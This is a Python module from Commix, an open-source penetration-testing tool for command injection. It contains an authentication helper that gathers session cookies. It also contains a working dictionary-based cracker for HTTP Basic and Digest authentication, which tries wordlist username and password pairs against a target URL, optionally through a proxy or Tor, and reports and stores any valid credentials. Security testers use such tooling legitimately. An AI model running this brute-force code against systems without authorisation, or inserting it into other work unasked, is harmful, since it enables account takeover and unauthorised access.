#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import os
import sys
import time
import base64
from src.utils import menu
from src.utils import settings
from src.utils import session_handler
from src.core.requests import proxy
from src.core.requests import headers
from src.utils import common
from src.core.injections.controller import checks
from src.thirdparty.six.moves import input as _input
from src.thirdparty.colorama import Fore, Back, Style, init
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.six.moves import http_cookiejar as _http_cookiejar

"""
If a dashboard or an administration panel is found (auth_url),
do the authentication process using the provided credentials (auth_data).
"""

"""
The authentication process
"""
def authentication_process(http_request_method):
  try:
    auth_url = menu.options.auth_url
    auth_data = menu.options.auth_data
    #cj = cookielib.CookieJar()
    cj = _http_cookiejar.CookieJar()
    opener = _urllib.request.build_opener(_urllib.request.HTTPCookieProcessor(cj))
    cookies = ""
    for cookie in cj:
        cookie_values = cookie.name + "=" + cookie.value + "; "
        cookies += cookie_values
    if len(cookies) != 0 :
      menu.options.cookie = cookies.rstrip()
      if settings.VERBOSITY_LEVEL != 0:
        info_msg = "The received cookie is "
        info_msg += str(menu.options.cookie) + Style.RESET_ALL + "."
        settings.print_data_to_stdout(settings.print_bold_info_msg(info_msg))
    _urllib.request.install_opener(opener)
    request = _urllib.request.Request(auth_url, auth_data.encode(settings.DEFAULT_CODEC), method=http_request_method)
    # Check if defined extra headers.
    headers.do_check(request)
    headers.check_http_traffic(request)
    # Get the response of the request.
    return _urllib.request.urlopen(request, timeout=settings.TIMEOUT)

  except Exception as err_msg:
    checks.connection_exceptions(err_msg)

"""
HTTP auth wordlists for usernames and passwords
"""
def define_wordlists():

  while True:
    message = "Do you want to use default wordlists for dictionary-based attack? [Y/n] > "
    do_update = common.read_input(message, default="Y", check_batch=True)
    
    if do_update in settings.CHOICE_YES:
      # Load default wordlists
      usernames = common.load_list_from_file(settings.USERNAMES_TXT_FILE, "usernames wordlist")
      passwords = common.load_list_from_file(settings.PASSWORDS_TXT_FILE, "passwords wordlist")
      info_msg = "Using default wordlists for dictionary-based authentication check."
      settings.print_data_to_stdout(settings.print_info_msg(info_msg))
      break

    elif do_update in settings.CHOICE_NO:
      # Load custom wordlists
      username_txt_file = common.read_input("Please enter usernames wordlist > ", default=None, check_batch=True)
      passwords_txt_file = common.read_input("Please enter passwords wordlist > ", default=None, check_batch=True)
      usernames = common.load_list_from_file(username_txt_file, "usernames wordlist")
      passwords = common.load_list_from_file(passwords_txt_file, "passwords wordlist")
      break

    elif do_update in settings.CHOICE_QUIT:
      raise SystemExit()

    else:
      common.invalid_option(do_update)

  return usernames, passwords

"""
Simple Basic / Digest HTTP authentication cracker.
"""
def http_auth_cracker(url, realm, http_request_method):
    settings.PERFORM_CRACKING = True
    # Define the HTTP authentication type.
    authentication_type = menu.options.auth_type
    # Define the authentication wordlists for usernames / passwords.
    usernames, passwords = define_wordlists()
    i = 1
    found = False
    total = len(usernames) * len(passwords)
    for username in usernames:
      for password in passwords:
        float_percent = "{0:.1f}%".format(round(((i*100)/(total*1.0)),2))
        # Check if verbose mode on
        if settings.VERBOSITY_LEVEL != 0:
          payload = "'" + username + ":" + password + "'"
          if settings.VERBOSITY_LEVEL >= 2:
            settings.print_data_to_stdout(settings.print_checking_msg(payload))
          else:
            settings.print_data_to_stdout(settings.END_LINE.CR + settings.print_checking_msg(payload) + settings.SINGLE_WHITESPACE * len(payload))
        try:
          # Basic authentication
          if authentication_type.lower() == settings.AUTH_TYPE.BASIC:
            authhandler = _urllib.request.HTTPBasicAuthHandler()
          # Digest authentication
          elif authentication_type.lower() == settings.AUTH_TYPE.DIGEST:
            authhandler = _urllib.request.HTTPDigestAuthHandler()
          authhandler.add_password(realm, url, username, password)
          opener = _urllib.request.build_opener(authhandler)
          _urllib.request.install_opener(opener)
          request = _urllib.request.Request(url, method=http_request_method)
          headers.do_check(request)
          headers.check_http_traffic(request)
          # Check if defined any HTTP Proxy (--proxy option).
          if menu.options.proxy or menu.options.ignore_proxy or menu.options.tor: 
            proxy.use_proxy(request)
          response = _urllib.request.urlopen(request, timeout=settings.TIMEOUT)
          found = True
        except KeyboardInterrupt :
          raise
        except (_urllib.error.HTTPError, _urllib.error.URLError):
          pass
        if found:
          if settings.VERBOSITY_LEVEL == 0:
            float_percent = settings.info_msg
        else:
          if str(float_percent) == "100.0%":
            if settings.VERBOSITY_LEVEL == 0:
              float_percent = settings.FAIL_STATUS
          else:
            i = i + 1
            float_percent = ".. (" + float_percent + ")"
        if settings.VERBOSITY_LEVEL == 0:
          info_msg = "Testing for valid HTTP authentication credentials."
          info_msg += float_percent
          settings.print_data_to_stdout("\r\r" + settings.print_info_msg(info_msg))
          
        if found:
          if not settings.LOAD_SESSION:
            session_handler.import_valid_credentials(url, authentication_type, url, username, password)
          valid_pair =  "" + username + ":" + password + ""
          if not settings.VERBOSITY_LEVEL >= 2:
            settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
          info_msg = "Authentication succeeded using credentials: '" + valid_pair + "'."
          settings.print_data_to_stdout(settings.print_info_msg(info_msg))
          return valid_pair

    err_msg = "Use the '--auth-cred' option to provide a valid pair of "
    err_msg += "HTTP authentication credentials (i.e --auth-cred=\"admin:admin\") "
    err_msg += "or place an other dictionary into '"
    err_msg += os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'txt')) + "/' directory."
    settings.print_data_to_stdout("\n" + settings.print_critical_msg(err_msg))
    return False

# eof